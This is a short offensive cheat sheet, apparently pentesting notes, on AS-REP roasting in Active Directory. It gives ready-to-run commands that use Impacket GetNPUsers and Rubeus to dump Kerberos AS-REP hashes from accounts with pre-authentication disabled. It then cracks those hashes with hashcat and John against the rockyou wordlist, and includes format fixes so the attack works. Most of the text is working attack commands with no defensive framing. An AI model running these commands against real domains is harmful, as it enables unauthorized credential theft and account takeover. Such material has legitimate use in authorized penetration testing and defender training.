AS-REP roasting works by scanning for users on an AD-network without the "Require pre-authentication" flag enabled.
Where normally, you'd need to send a ticket request to the DC encrypted with the target user's password, it is not required for machines without pre-authentication.
This means you can get the KRB-AS-REP hash without the user's password.

## Impacket
##### Requirements
Domain name of the AD
IP address of the Domain Controller
A list of target users

##### Obtaining hashes
Impacket will dump the KRB5AS-REP hash of all users with pre-authentication disabled:
```
impacket-GetNPUsers 'DOMAIN_NAME/' -usersfile users.txt -no-pass -dc-ip 10.10.30.254
```
Note: make sure to add the `/` after the `DOMAIN_NAME`, otherwise the exploit will fail.

## Rubeus.exe
##### Requirements
Access to the AD (any)

##### Obtaining hashes
Rubeus will dump the KRB5ASREP hash of all users with pre-authentication disabled:
```
./Rubeus.exe asreproast
./Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\hashes.txt
```

##### Cracking hashes
Important: Make sure to add "$23" to the hash, so that it resembles
```
$krb5asrep$23$USERNAME@MACHINE.DOMAIN:HASH
```

Crack hashes using Hashcat:
```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
John:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```